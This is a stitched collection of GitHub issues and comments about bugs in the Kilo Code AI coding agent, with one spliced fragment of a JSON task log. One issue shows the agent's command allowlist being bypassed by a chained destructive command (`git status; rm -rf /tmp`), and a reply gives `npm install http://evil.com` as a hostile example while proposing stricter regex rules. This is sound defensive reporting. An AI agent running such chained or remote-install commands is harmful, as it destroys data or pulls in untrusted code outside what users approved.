- Documented in Google Cloud
- Cost-effective alternatives to Gemini/Claude
- Valuable for specialized tasks (coding with Qwen Coder, reasoning with DeepSeek R1, multilingual with Kimi K2)

This significantly limits Kilocode's value proposition for enterprise users with Google Cloud commitments.

## Proposed Solution

A complete fix recommendation:

### 1. New Handler for MaaS Models

Create `VertexMaaSHandler` (separate from `VertexHandler`) that:
- Constructs OpenAI-compatible URLs: `/endpoints/openapi/chat/completions`
- Formats requests using OpenAI message structure with `{publisher}/{model}` format
- Handles streaming responses in SSE format
- Supports native tool calling for compatible models
- Uses OAuth2 authentication (GoogleAuth with keyFile or JSON credentials)

### 2. Provider Routing Logic

Update `src/api/index.ts` to route based on `vertexPublisher`:
```typescript
if (provider === "vertex") {
  const model = vertexModels[modelId]
  if (model.vertexPublisher && model.vertexPublisher !== "google") {
    return new VertexMaaSHandler(options)
  }
  return new VertexHandler(options) // Gemini/Claude models
}
```

### 3. Model Metadata Enhancement

Ensure all MaaS models in type definitions have the `vertexPublisher` field set correctly:
- `meta` - Llama 4 models
- `deepseek-ai` - DeepSeek V3.2, R1
- `qwen` - Qwen Coder, Qwen3 models
- `moonshotai` - Kimi K2
- `minimaxai` - MiniMax M2
- `openai` - GPT-OSS
- `zai` - GLM-4.7 models

### 4. Documentation

Create clear documentation explaining:
- How Vertex AI MaaS differs from native Gemini
- Regional availability of different models
- Authentication setup (OAuth2 only - keyFile or JSON credentials)
- Example configuration for each provider
- That API key authentication is NOT supported for MaaS models

## Additional Context

### Regional Availability
Many MaaS models are region-restricted:
- Llama 4: `us-east5`
- DeepSeek R1: `us-central1`
- Qwen models: `us-south1`
- Global: Kimi K2, MiniMax M2, DeepSeek V3.2, Qwen3 Next

### Tool Calling Support
MaaS models support native tool calling via OpenAI-compatible function calling:
- ✅ Qwen Coder 480B, Qwen3 235B, Qwen3 Next 80B
- ✅ DeepSeek V3.2, DeepSeek R1
- ✅ Kimi K2 Thinking
- ✅ MiniMax M2
- ✅ ZAI.org GLM-4.7
- ❌ Llama 4 models (no native tool support)
- ❌ OpenAI GPT-OSS (no native tool support)

### Authentication Requirements
Unlike Gemini models which can use API keys via Google AI Studio, **MaaS models require Google Cloud authentication**:
- Service Account Key File (JSON file path via `vertexKeyFile`)
- Service Account JSON credentials (inline JSON string via `vertexJsonCredentials`)

No API key option is available for MaaS endpoints.

## References

- [Vertex AI Partner Models Documentation](https://docs.cloud.google.com/vertex-ai/generative-ai/docs/partner-models/use-partner-models)
- [Partners model Pricing](https://cloud.google.com/vertex-ai/generative-ai/pricing#partner-models)
- [Partner Models Deprecations](https://docs.cloud.google.com/vertex-ai/generative-ai/docs/deprecations/partner-models)




### Reproduction steps

1. Select any MaaS model
2. Try to prompt it

### Provider

Vertex AI

### Model

_No response_

### System Information

Not relevant. Tested also in VS Code plugin - same issue.

title: Invalid array length
body:
### Plugin Type

VSCode Extension

### App Version

4.151.0

### Description


The `kilocode.kilo-code` extension becomes completely unresponsive to user interaction and ceases to generate any content after it displays a permission prompt (e.g., requesting "approval or rejection"). While the broader VS Code UI remains responsive, clicking either "Approve" or "Reject" on this specific extension-generated prompt has no discernible effect from the extension's perspective. Subsequently, the extension stops functioning, effectively failing to process further requests or output content.

This issue persists even when the extension's settings are configured for "auto-approve," suggesting the auto-approval mechanism is not properly engaged or fails to prevent the prompt/freeze. The context implies these prompts are for standard operations like file reading, which are generally considered low-permission activities.

A consistent `RangeError: Invalid array length` is logged in the VS Code developer console or extension output, indicating a critical issue during array creation or manipulation within the extension's JavaScript runtime, specifically triggered during or immediately after the permission prompt interaction.




### Reproduction steps

1. Open VS Code on Windows 11.
2. Ensure `kilocode.kilo-code` extension version `4.151.0` is enabled.
3. Confirm that the "auto-approve" setting for the `kilocode.kilo-code` extension is enabled.
4. Perform an action that typically triggers a permission request from the `kilocode.kilo-code` extension. For instance:
* Opening a project workspace.
* Opening a specific code file (e.g., Python, JavaScript) that the extension would analyze.
* Interacting with code (e.g., typing, saving) in a way that prompts the extension's features.
5. Observe that a permission prompt appears from `kilocode.kilo-code` (e.g., "requires approval or rejection").
6. Click either "Approve" or "Reject" on the prompt.

### Provider

_No response_

### Model

_No response_

### System Information

_No response_

And If I exit the idea , the node.exe doesn't exit. ### Reproduction steps using the kilo code in idea and then exit idea ### Provider _No response_ ### Model _No response_ ### System Information _No response_
author: PctAIGM

title: Model replies sometimes duplicate and show multiple times
body: ### Plugin Type VSCode Extension ### App Version 4.151.0 ### Description This seems to be isolated to the `Code` sub-agent. It will print out what the model said/did 2x. So anytime it is `Thinking`, `Kilo Said`, etc ### Reproduction steps 1. Use orchestrator or code agent. 2. Watch the task as it goes through the steps ### Provider Open AI Compatible (nano-gpt.com) ### Model zai-org/GLM 4.7 (thinking) ### System Information _No response_
author: djdembeck

title: Error: Error: Unknown Error: The model returned the following errors: tools.79.custom.input_schema: JSON schema is invalid.
body:

VSCode Extension

### App Version

Version: 4.148.0 (827b253b)

### Description

`Error: Error: Unknown Error: The model returned the following errors: tools.79.custom.input_schema: JSON schema is invalid.`

This error has suddenly appeared. It interrupts all attempts at using kilo. Restart, reinstall, update, new task did not fix it.

title: Kilo Code VS Code extension does not detect installed CLI in Remote-WSL, while CLI works natively in WSL and Windows
body: ### Plugin Type VSCode Extension ### App Version 4.149.0 ### Description I am using the Kilo Code extension inside a VS Code Remote-WSL (Ubuntu on WSL2) environment. The kilocode CLI is installed and works correctly both in WSL and on Windows natively, but the extension still reports that the CLI is not found and therefore cannot fetch or display models. ```bash which kilocode /usr/local/bin/kilocode kilocode --version 0.24.0 ``` However, inside VS Code Remote-WSL, the extension log shows: ``` [AgentManager] kilocode not found in PATH lookup [AgentManager] kilocode CLI not found [AgentManager] Cannot fetch models: CLI not found ``` Environment: * Windows 10 + WSL2 Ubuntu * VS Code running in Remote-WSL * Kilo Code extension version: 4.149.0 * Kilo CLI installed via npm and accessible in PATH * Gateway selected: Kilo Gateway CLI is installed also globally in WSL at /usr/bin/kilocode and works in both interactive and login shells, but the extension still reports CLI not found. ### Reproduction steps 1. Install kilo-code VS Code extension. 2. Install kilocode CLI globally inside WSL (e.g. via `npm install -g @kilocode/cli`). 3. Verify CLI works in WSL: ```bash which kilocode kilocode --version ``` 4. Open a project in VS Code Remote-WSL (using “Open Folder in WSL…”). 5. Open Kilo Code sidebar → Settings → Providers → Kilo Code Provider → try to choose model . 6. Observe that model list is empty, and extension logs show “CLI not found”. 7. Now open the same project directly from WSL terminal: ```code . ``` 8. Observe that models are displayed correctly. 9. Open any project in Windows VS Code (non-WSL). 10. Observe that models are displayed correctly there as well. ### Provider Kilo Code ### Model _No response_ ### System Information Host OS: Windows 10 Home x64 WSL Environment: WSL2 (Ubuntu 22.04) CPU: AMD Ryzen 7 7700 GPU: NVIDIA RTX 4070 SUPER VS Code: Version: 1.108.1 Running in Remote-WSL Kilo Code Extension: Version: 4.149.0 Kilo Code CLI: 0.24.0

title: [Bug] 400 Proto Mismatch with gemini-3-pro-preview via OpenAI Proxy (Regression/Specific to Kilo)
body:
### Plugin Type

VSCode Extension

### App Version

4.148.1

### Description


**Description**
I am encountering a blocking `400 Invalid JSON payload` error when using `gemini-3-pro-preview` in **Orchestrator Mode**.

**Critical Comparison (Works in Roo Code):**
I am using the **exact same API configuration** (same OpenAI-compatible proxy provider, same endpoint, same API key, same model) in **Roo Code**, and it works perfectly.
However, in **Kilo Code**, it fails immediately with a Protocol Buffer mismatch error.

**Analysis:**
Since the API provider works in other clients, the issue lies specifically in **how Kilo Code constructs the `tools` definition payload** for the Orchestrator mode.

The error details indicate a structural conflict in the generated JSON Schema:
*   **Error:** `Unknown name "type" ... Proto field is not repeating, cannot start list`
*   **Location:** `tools[0].function_declarations[0]...properties[0].value`

It appears Kilo Code is generating a schema field (likely defining a list or array types) that the Gemini backend (via the proxy) interprets as a repeated field violation. Kilo might be sending an array where a scalar is expected, or vice versa, in a way that differs from Roo Code's implementation.


**Error Log**
```json
{
  "error": {
    "timestamp": "2026-01-19T03:22:47.679Z",
    "version": "4.148.1",
    "provider": "openai",
    "model": "gemini-3-pro-preview",
    "details": "400\nOpenAI completion error: 400 Invalid JSON payload received. Unknown name \"type\" at 'tools[0].function_declarations[0].***.properties[0].***.***.properties[0].value': Proto field is not repeating, cannot start list.\nInvalid JSON payload received. Unknown name \"type\" at 'tools[0].function_declarations[2].***.properties[2].value': Proto field is not repeating, cannot start list."
  }
}
```



**Request**
Please investigate the JSON Schema generation for Tools in Orchestrator mode. It seems to produce a structure that is incompatible with Gemini's strict Proto validation when passed through an OpenAI proxy, whereas Roo Code's schema generation remains compatible.

### Reproduction steps

1.  Set up an OpenAI-compatible proxy that forwards to Google Gemini.
2.  Verify the setup works in Roo Code (or `curl`).
3.  Open Kilo Code -> Orchestrator Mode.
4.  Send a task.
5.  Observe the 400 Proto error.

### Provider

Kilo Code

### Model

gemini-3-pro-preview

### System Information

*   **App Version:** 4.148.1
*   **Mode:** Orchestrator
*   **Model:** gemini-3-pro-preview
*   **Provider:** configured as `openai` (Custom Base URL / Proxy)

title: Issue #5053 not resolved in version 0.22.0: File content still being erased
body:
### Plugin Type

Kilo Code CLI

### App Version

0.22.0

### Description

When creating files with the CLI, it initially succeeds (e.g., `📄 Create(...) +123 lines`) but then immediately overwrites them with empty files of the same name. The 'User Feedback' diff reflects this (e.g., `@@ -123 +0,0 @@`), wiping the file right after creation. This is unfortunately the exact same behaviour outlined in the original issue.

#### Follow-up to Issue #5053
The issue described in #5053 was marked as resolved by #5000 (merged with version 0.22.0), but the problem still persists. 

I hope that reposting this issue isn't a problem after the last one was closed. If it is, please don't hesitate to let me know! I'm still a Github newbie...

### Reproduction steps

1. Update KiloCode CLI to version `0.22.0` (I haven't gotten around to testing it in 0.23.0.)
2. Create a new test directory with a unicode characters in path.
3. Run `kilocode` in that directory.
4. Ask the CLI to generate a document with content.
5. The CLI should log `📄 Create(...) +### lines`, but the User Feedback box will immediately show `@@ -### +0,0 @@`.

### Provider

Chutes AI

GLM 4.7 TEE

OS: macOS Sequoia 15.7.4 (Build 24G503)

author: tejasxo

comments.author: rbradyhunt
comments.body:
+1 on this being a critical blocker.

**Environment:**
- KiloCode v5.2.0 (also tested v5.2.1)
- AWS Bedrock provider
- Model: `us.anthropic.claude-opus-4-5-20251101-v1:0`
- AWS Profile authentication (SSO)

**Exact error:**
```
Expected `thinking` or `redacted_thinking`, but found `tool_use`. When `thinking` is enabled, a final `assistant` message must start with a thinking block
```

**Reproduction:**
1. Configure Bedrock provider with Opus 4.5
2. Start any task that uses tools (file reading, etc.)
3. Error occurs on second turn when tool results are returned

**Impact:** Cannot use Bedrock with Claude Opus 4.5 extended thinking at all. This is a significant limitation for enterprise users who need to route through AWS Bedrock for compliance/cost reasons.

PR #5149 appears to address this but has merge conflicts. Would appreciate prioritization of this fix.

author: Carton9

comments.author: lqw1
comments.body: Downgrading to version 4.144.0 can solve the problem.

comments.author: Carton9
comments.body: I do downgrading, but it still is a bug.

comments.author: Sn0wo2
comments.body:
https://github.com/RooCodeInc/Roo-Code/issues/10477
> We are removing the XML tool calling protocol from the codebase. Keeping two tool calling architectures massively increases complexity. Every fix, every feature, every tool-related issue forces Roo to reason about two completely different execution paths. That slows development, increases bugs, and makes it harder to move Roo forward. It also guarantees that XML users would slowly get stuck with an increasingly outdated experience as improvements land only in the native path.
> 
> https://blog.roocode.com/p/sorry-we-didnt-listen-sooner-native

Since the upstream roo code of kilo forcibly deletes the XML tool call, it causes the native tool call to be used by default
https://github.com/RooCodeInc/Roo-Code/pull/10281/

Currently, it can only be resolved by downgrading to version 4.144.0
It looks like they don't intend to fix the issue either, or that it's not a bug at all, but rather their own path adjustment

title: Tool Protocol Settings failed to work.
body: ### Plugin Type VSCode Extension ### App Version 4.147.0 (364143ab) ### Description Even if the `Kilo-code: Tool Protocol` is set as `xml`, the tool calling is in fact sent as native. And degrading to 4.144.0 will solve this issue. ### Reproduction steps This bug need no reproduce step. Just use the default setting and use code mode to request models. When the model provider only support xml tool calling, the response will be: ``` 500 OpenAI completion error: 500 Tool calling is disabled by configuration. The request contains tool definitions or tool-related content, which is not allowed. Please remove 'tools', 'tool_choice', tool calls, or tool results from your request. ``` ### Provider _No response_ ### Model _No response_ ### System Information _No response_
author: small-lovely-cat

comments.author: lqw1
comments.body: Other models also have issues. An error message 'Proto field is not repeating, cannot start list' occurred. However, the problem was resolved when downgraded to version 4.144.0.

comments.author: small-lovely-cat
comments.body: It seems the support has been removed in commit d00d9edec587655d50c85dd5b195f0598b329153. Not sure why this option is kept in settings.

comments.author: stanus74
comments.body:
This is a critical issue for the local LLM community (llama.cpp users). Many of us use high-end local hardware to run models like DeepSeek-R1-Distill-Qwen.

These models rely heavily on XML tags for tool calling, especially because the local llama-server often struggles with the 'native' JSON tool-signaling forced by newer Kilo Code versions.

Removing or breaking the XML Tool Protocol option makes it impossible to use local models as agents. Please restore the XML selection in Advanced Settings and ensure the fallback parser is working again.

comments.author: Drilmo
comments.body:
For the Claude Code provider, the system prompt must be exactly "You are Claude Code, Anthropic's official CLI for Claude." — this is what Anthropic checks on their end.

Other systems using the Claude Code provider work perfectly fine because they correctly set this system prompt. However, Kilocode does not seem to apply it, and the system prompt overrides don't take effect for the Claude Code provider, so there is no way to fix this from the user side.

This looks like a bug in how Kilocode handles the system prompt for the Claude Code provider.

```typescript
// 方法 1: 页面级别配置

fetch(url, { next: { revalidate: 180 } })

数据流: 严禁在客户端使用 useEffect 请求初始数据。必须在服务端获取并传递。
静态优化: 必须使用 next/image (补全 alt/fill) 和 next/font。
布局逻辑: 严禁 JS 控制组件显隐，统一使用 Tailwind 响应式类名（如 hidden md:block）。
3. SEO 极致优化
元数据: 每个 page.tsx 必须导出 generateMetadata (包含 Title 模板、Description、Canonical)。
结构化数据: 产品详情页必须嵌入 JSON-LD (Product Schema)。
语义化: 拒绝“Div 汤”。严格使用 <header>, <main>, <nav>, <footer> 等语义化标签。
4. 后端协作与数据完整性
接口对齐: 严格匹配 Go (Gin/GORM) 接口字段。
零侵入性: 严禁 硬编码假数据（价格、库存等）。若接口缺少字段，必须在回复中高亮提醒：“后端接口缺少 [字段名]，请补充。”
5. 代码质量与安全
强制类型: 严禁使用 any。所有 API 响应必须定义 Interface。
鲁棒性: Server Actions 必须包裹 try-catch 并返回标准错误格式。
交互: 遇重大重构或调试需求，先停下来询问我。
</custom_instructions>
You have not created a todo list yet. Create one with `update_todo_list` if your task is complicated or involves multiple steps.
</environment_details>"
        }
      ],
      "ts": 1768416152263
    }
  ]
}

title: [Bug] v4.146.0 Regression: "Expected thinking" 400 Error with OpenAI-Compatible Provider (ProxyPal)
body:
### Plugin Type

VSCode Extension

### App Version

v4.146.0

### Description

I am encountering a blocking issue after updating to version **4.146.0**. I am using **ProxyPal** to route requests to Gemini/Claude models via the **OpenAI-compatible provider** setting in Kilo Code.

**The Issue:**
When using a model with "Extended Thinking" enabled (e.g., `gemini-claude-opus-4-5-thinking`), I receive a `400 Invalid Request` error whenever the model attempts to use tools.

**Error Message:**
`messages.1.content.0.type: Expected 'thinking' or 'redacted_thinking', but found 'tool_use'.`

**Regression Note:**
Everything was working correctly before the latest update. This suggests a change in how Kilo Code constructs the message history or handles `thinking` blocks for OpenAI-compatible providers in v4.146.0.

**Logs:**
```json
{
  "timestamp": "2026-01-14T17:54:20.976Z",
  "version": "4.146.0",
  "provider": "openai",
  "model": "gemini-claude-opus-4-5-thinking",
  "details": "400\nOpenAI completion error: 400 {\"type\":\"error\",\"error\":{\"type\":\"invalid_request_error\",\"message\":\"messages.1.content.0.type: Expected `thinking` or `redacted_thinking`, but found `tool_use`. When `thinking` is enabled, a final `assistant` message must start with a thinking block...\"},\"request_id\":\"req_vrtx_011CX7hTPNRYAnghVbyhRW5a\"}"
}

### Reproduction steps

1. Configure Kilo Code to use "OpenAI Compatible" provider pointing to a proxy (e.g., ProxyPal).
2. Select a model that supports extended thinking (e.g., `gemini-claude-opus-4-5-thinking`).
3. Enable "Reasoning Effort" (Very High) in Kilo Code settings.
4. Start a task that requires the agent to use tools (e.g., `list_files` or `read_file`).
5. Observe the 400 error immediately when the agent attempts to execute the tool.

### Provider

OpenAI Compatible (via ProxyPal)

### Model

gemini-claude-opus-4-5-thinking

### System Information

Windows 11, VS Code latest

title: LLM Communication Bypasses VS Code Proxy Settings
body:
### Plugin Type

VSCode Extension

### App Version

4.143.2

### Description


## 1. Problem Description

Kilocode fails to use the proxy settings configured in VS Code for LLM-related communication in OpenAI Compatible mode. While standard operations like extension updates correctly route through the proxy, all network requests to the LLM provider bypass it. This results in connection timeouts for users operating in environments that require a proxy for internet access.

The issue detected during using providers based on the OpenAI-compatible API, Azure-hosted models, rendering them unusable for proxied users.

## 2. Source-Level Analysis

The investigation of the codebase revealed the following:

-   **Networking Library:** LLM communication for OpenAI-compatible providers is managed by the `openai-node` library.

-   **Client Instantiation:** The `OpenAI` and `AzureOpenAI` clients are instantiated in two key locations:
    -   `src/api/providers/base-openai-compatible-provider.ts`
    -   `src/api/providers/openai.ts`
 
-   **Root Cause:** The core issue is that the `OpenAI` client was being instantiated without any proxy configuration. The `openai-node` library supports proxying via an `httpAgent` property in its constructor options, but this was not being used. The application was not reading the VS Code proxy setting and passing it down to the networking layer.


## 3. Reproduction steps

1.  **Configure Proxy:** Set a valid HTTP proxy in VS Code
2.  **Ensure communication works in VS Code**: Check connection with a git repo, browse Extension marketplace, etc...
3.  **Configure LLM Provider:** Set up Kilocode to use an OpenAI-compatible LLM that is only accessible through the configured proxy.
4.  **Attempt to communicate with the LLM** (e.g., ask a question in the chat).
5.  **Observe Failure:** The request fails with a connection timeout error.
6.  **Verify Proxy Logs:** Check the proxy server's logs and confirm that no incoming requests were received from Kilocode for the LLM communication.

### Provider

OpenAI Compatible

### Model

Model independent

### System Information

Windows-11
author: drinyo

title: gemini-3-pro-preview context window incorrectly limited to 128k (Expected 1M)
body: ### Plugin Type VSCode Extension ### App Version 4.143.2 ### Description I am experiencing a critical issue where the context window for `gemini-3-pro-preview` (Google Gemini provider) is being incorrectly throttled or downgraded. Initially, the context window correctly shows __1,000,000 tokens__. However, after using the extension for some time, the window size automatically drops to __128,000 tokens__. This has happened multiple times. Most importantly, after clicking __"Reset Data" (重置数据)__ in an attempt to fix this, the context window is now stuck at __128,000 tokens__ and will not revert to the expected 1M capacity. This suggests that the downgraded state is being incorrectly cached or written back to the persistent configuration. __Expected Behavior:__ The context window should remain at __1,000,000 tokens__ and "Reset Data" should restore the model's default full capacity. __Actual Behavior:__ The capacity drops to __128,000 tokens__ during use and becomes permanently stuck at that limit even after a data reset. ### Reproduction steps 1. Use Kilo Code with gemini-3-pro-preview (initially at 1M context). 2. Use the chat/coding features for a period of time. 3. Observe the context window display in settings suddenly changing to 128,000. 4. Click "Reset Data" in settings. 5. The context window remains at 128,000 tokens. ### Provider google gemini ### Model gemini 3 pro & flash ### System Information Windows11 & wsl2

### Plugin Type

title: command-approval-patterns allow piping to totally different command
body:
### Plugin Type

VSCode Extension

### App Version

4.141.2 (3ae05ef0)

### Description

When adding an allowed command, Kilocode can run totally different (even denied commands) by appending it to the command. For example, given this configuration:

```json
{
	"execute": {
		"enabled": true,
		"allowed": [
			"npm", // Allows all npm commands
			"git status", // Allows all git status commands
			"ls -la" // Only allows exactly "ls -la"
		],
		"denied": [
			"git push --force" // Denies this specific command even if "git" is allowed
		]
	}
}
```
It is possible that Kilocode runs `git status; rm -rf /tmp` as it begins with `git status`


### Reproduction steps

Ask Kilocode to run that command.

### Provider

OpenAI Compatible

### Model

gpt-oss

### System Information

_No response_
author: sanderma

comments.author: sanderma
comments.body: I would suggest you add regex matching, so we can exclude things like `;` and `|`

comments.author: markijbema
comments.body: We do, at least for `&&` and `|`, are you suggesting `;` is missing?

comments.author: sanderma
comments.body:
Apologies for the late reply.

I believe everything that would allow another command to run is missing (like `;`).
And I believe that a regex would allow users to fix it themselves, and even share rules.

comments.author: sanderma
comments.body:
Saw in [4915](https://github.com/Kilo-Org/kilocode/pull/4915) that you split the commands and verify every command. That's smart. That should fix my specific issue.

Future me still would like more control on the allowlist. Reasons:

1. Prevent Dangerous Flags
• Issue: Whitelisting git push currently allows the destructive git push --force.
• Regex: ^git push$
• This forces an exact match, blocking any additional flags or arguments.
2. Validate Input
• Issue: Whitelisting npm install currently allows malicious sources like npm install http://evil.com.
• Regex: ^npm install [a-z0-9-]+$
• This restricts arguments to safe, alphanumeric package names only.

title: Support custom provider and custom model names when using proxy in Claude Code
body:
### Description

When using Kilocode with a proxy that exposes Claude models under a **custom provider name**, Claude Code fails with:

```json
{"error":{"message":"unknown provider for model claude-opus-4-5-20251101","type":"invalid_request_error"}}
```

In the Claude Code settings UI, the **Model** dropdown only allows selecting from a fixed list of built-in Claude models. There is no way to:

- Specify a custom model name that the proxy expects, or
- Configure the custom provider name that the proxy uses.

Because of this, requests to `claude-opus-4-5-20251101` (and other proxied models) fail with `unknown provider for model ...`. The error repeats with retry timers like:

```
<retry_timer>60</retry_timer>
<retry_timer>8</retry_timer>
{"error":{"message":"unknown provider for model claude-opus-4-5-20251101","type":"invalid_request_error"}}
```


### Expected behavior

- Claude Code should allow configuring:
  - A **custom provider name** when using a proxy, and/or
  - **Custom model IDs** (not just the built-in list), so they can match what the proxy exposes.
- With this configuration, models like `claude-opus-4-5-20251101` should work through a proxy without hitting `unknown provider` errors.


### Actual behavior

- The **API Provider** is set to "Claude Code".
- The **Model** field is a dropdown with a fixed set of Claude model IDs; it does not allow typing a custom model name.
- Requests go to the proxy, but the proxy's custom provider name is not recognized by Kilocode/Claude Code, leading to:
  - `{"error":{"message":"unknown provider for model claude-opus-4-5-20251101","type":"invalid_request_error"}}`
- Other clients that let me configure both provider and model work fine with the same proxy.


### Steps to reproduce

1. Set up an OpenAI-compatible proxy (e.g. LiteLLM or a custom gateway) that:
   - Exposes Claude models like `claude-opus-4-5-20251101`,
   - Uses a **custom provider name** (e.g. `my_claude_provider`).
2. Configure Kilocode / Claude Code to point to this proxy endpoint.
3. Open Claude Code settings and try to configure the model:
   - Note that the **Model** dropdown only offers built-in Claude models and does not allow entering a custom model string.
4. Use Claude Code with the selected model.
5. Observe repeated `unknown provider for model claude-opus-4-5-20251101` errors.


### Environment

- Kilocode version: Latest
- Claude Code extension version: Latest
- IDE: VS Code / JetBrains
- OS: macOS
- Proxy type: OpenAI-compatible proxy
- Proxy provider name: Custom provider


### Suggested improvement

- Allow entering **custom model IDs** in the Model field when using Claude Code with a proxy (not just selecting from a fixed dropdown), and/or
- Expose configuration for the **provider name** that Claude Code uses when talking to the proxy.
- Alternatively, read provider/model mapping from a config file so users can align Kilocode with their proxy configuration.

title: Jetbrains: built-in tools write_to_file and apply_diff execution fail on WSL2
body:
### Plugin Type

JetBrains Plugin

### App Version

v4.138.0

### Description

Might be a duplicate of #2466

When trying to apply diff or write to file, execution fails with the following exceptions:

```
Error applying diff:
Failed to execute diff command for \\wsl.localhost\Ubuntu-22.04\home\[redacted]\something.java: Cannot read properties of undefined (reading 'toString')
```

```
Error handling partial write_to_file:
Failed to execute diff command for \\wsl.localhost\Ubuntu-22.04\home\[redacted]\something.java: Cannot read properties of undefined (reading 'toString')
```

### Reproduction steps

1. Open a remote WSL project in Jetbrains (e.g. [cloned sample java project](https://github.com/spring-projects/spring-petclinic#))
2. Prompt for any file update trigger instruction (e.g. "Insert comments in referenced file")
3. Action fails (see attached exceptions)

OpenAI compatible

author: peploleum

comments.author: Quantumatum
comments.body: Have you found a workaround for this?

comments.author: peploleum
comments.body:
Hi @Quantumatum. No luck so far. It's a major hindrance for our use case. It spreads further that edit tools too: creation, update and delete operations on rules & worflows from the dedicated UI button fail as well. 

My team are considering dropping the use of kilo code because of this.

We did try as a workaround to create a custom mode with the instructions not to apply any write or update operations. It is not the way to go because kilo code switches modes anyway even when prompted not to.

- usage information is incomplete

title: apply_diff False Positive - Validator triggers on tool's own syntax marker
body:
### Plugin Type

VSCode Extension

### App Version

4.140.2 (d485dfed)

### Description

The apply_diff tool in KiloCode includes a safety check intended to prevent accidental Git merge markers (like >>>>>>>) from being written into source code. However, the parser/validator incorrectly flags its own required closing marker >>>>>>> REPLACE as a "special marker in content", leading to a Catch-22: the tool cannot be used because it contains the very marker it requires for operation.

### Reproduction steps


## Steps to Reproduce
1. Have a text file (e.g., `requirements.txt`) with standard content.
2. Attempt to use the `apply_diff` tool to append a new line at the end of the file.
3. Provide a standard Search/Replace block that follows the mandatory format:
   ```
   <<<<<<< SEARCH
   :start_line:10
   -------
   [existing_line]
   =======
   [existing_line]
   [new_line]
   >>>>>>> REPLACE
   ```
4. Execute the tool.

## Sample Payload (Triggering the bug)
```xml
<apply_diff>
<path>requirements.txt</path>
<diff>
<<<<<<< SEARCH
:start_line:1
-------
torch>=2.0.0
transformers>=4.45.0
diffusers>=0.30.0
huggingface-hub>=0.25.0
=======
torch>=2.0.0
transformers>=4.45.0
diffusers>=0.30.0
huggingface-hub>=0.25.0
gradio>=4.0.0
>>>>>>> REPLACE
</diff>
</apply_diff>
```

## Expected Behavior
The tool should recognize `>>>>>>> REPLACE` as the **end of the diff block** (syntax) and apply the changes to the file.

## Actual Behavior
The tool aborts **before** applying the changes with the following error:
`ERROR: Special marker '>>>>>>> REPLACE>' found in your diff content at line [X]`



## Environment
- **OS:** Windows 11 (observed, likely cross-platform)
- **Extension:** KiloCode (VS Code)
- **Model:**  Grok 4 Code Fast (via KiloCode)


## Root Cause Analysis
The validator seems to perform a raw string search for `>>>>>>> REPLACE` across the entire `diff` parameter *before* parsing the SEARCH/REPLACE structure. Since the string is present (as it is required by the tool's own API), the safety check triggers a false positive. The validator fails to distinguish between the marker as **content** (within the SEARCH or REPLACE sections) and the marker as **syntax** (the delimiter).

## Impact
- Prevents AI agents from performing "surgical" edits, forcing them to fallback to `write_to_file` (full file rewrites).
- Full rewrites are slower, more expensive (tokens), and prone to truncating large files, which can lead to code corruption.

## Additional Notes
- **Workaround:** Instructing the agent to use `write_to_file` for the entire file content.
- This bug essentially renders the `apply_diff` tool unreliable for any edits where the model's output formatting might be scanned by the pre-application validator.


### Provider

_No response_

### Model

_No response_

### System Information

## Environment
- **OS:** Windows 11 (observed, likely cross-platform)
- **Extension:** KiloCode (VS Code)
- **Model:**  Grok 4 Code Fast (via KiloCode)

Steps to Reproduce Open Marketplace (or MCP Marketplace) on Machine B Observe the list does not show any items (blank/stuck/empty) Expected Behavior Marketplace should successfully fetch and display the item list. Actual Behavior On Machine B, Marketplace shows no items (or keeps loading). What I’m asking maintainers To help isolate potential network/access issues, could you please share: The official domains/URLs the Marketplace uses to fetch the list/items (API endpoints, static assets, CDN, etc.) Any recommended health-check / minimal endpoint I can test to verify connectivity + TLS + response format What diagnostics would be most helpful to provide: how to enable and collect client/plugin debug logs any visible error messages/status codes (if available) DNS results (A/AAAA/CNAME) and DNS servers used whether proxy/system proxy/TUN is in use (sanitized), routing mode timestamps and repro frequency Note: I did try curl against some potentially related addresses, but I’m not confident those are the exact endpoints Marketplace uses, so I’m not treating them as proof. I’d prefer the official guidance on what to test and what info to collect. ### Reproduction steps Open Marketplace (or MCP Marketplace) on Machine B Observe the list does not show any items (blank/stuck/empty) ### Provider _No response_ ### Model _No response_ ### System Information _No response_

comments.author: lgrgic
comments.body:
I'm on a mac... I tried to reproduce the issue using docker and dev containers, but I wasn't able to reporduce it outside of WSL. So, it seems this issue is related to WSL and is likely caused by IPv6 DNS resolution failures in that env - that's why logs show repeated timeouts

A possible workaround would be to force Node's resolution to prefer IPv4 during extension activation, something like:
`dns.setDefaultResultOrder('ipv4first')`
@kevindaffaarr 

UPDATE: 
There is already a workaround via `configureNetworkForEnvironment` helper (it's there in the code but it's not used anywhere) which detects WSL environment and forces Node to prefer IPv4 using `dns.setDefaultResultOrder('ipv4first')` in the extension lifecycle. Validation would need to happen in a Windows/WSL environment.

comments.author: lgrgic
comments.body:
It's odd that you're not seeing any models at all. The extension uses Promise.allSettled, which means even if some providers fail (like Gemini timing out), you should still see models from other providers that work. Today I tried to reproduce the issue using VS Code insider from WSL - but everything works fine on this machine.

Can you try:

- close VS Code Insider
- run in PowerShell: `wsl --shutdown`
- run wsl
- restart VS Code Insider

This will rest the WSL network stack and can fix these connectivity issues.

**or**
- can you try switching models via the Kilo Code CLI

If that doesn't work:
- can you access the internet from WSL? Try: `curl -v https://api.google.com`
- are you on a VPN or corporate network?

Setting model works if you have the exact string and choose "custom". But I never get a list or a working search.

comments.author: lgrgic
comments.body:
So, I managed to reproduce this on my other machine (Windows+WSL2).

What fixed it for me was:
- clearing Kilo Code’s Remote-WSL cache, and making sure the proxy CA was trusted by the Node process used by the Remote-WSL extension host, followed by restarting the WSL server.

**clear the cache (WSL):**
```
rm -rf ~/.vscode-server*/data/User/globalStorage/kilocode.kilo-code
pkill -f vscode-server || true
```

**making sure the CA is trusted in WSL:**
```
sudo cp <corp-ca>.pem /usr/local/share/ca-certificates/corp-ca.crt
sudo update-ca-certificates
pkill -f vscode-server || true
```

if you prefer not to touch the system trust store, you can explicitly tell Node which CA to trust:
```
export NODE_EXTRA_CA_CERTS=/path/to/corp-ca.pem
code .
```

title: Gemini CLI Provider returns "Free Tier Rate Limit Exceeded" error even with active Google AI Pro subscription
body:
### Plugin Type

Kilo Code Extension in VSCODE

### App Version

latest

### Description

## Description

When using Gemini CLI as the provider in Kilo Code, the application consistently returns "Free Tier Rate Limit Exceeded" error messages, even though I have an active Google AI Pro subscription.

## Expected Behavior
The Gemini CLI provider should recognize the Google AI Pro subscription and use the appropriate API quotas instead of treating requests as free tier.

## Actual Behavior
Every request to the Gemini CLI provider results in a rate limit error, preventing any usage of the provider despite having a valid paid subscription.

## Authentication Details
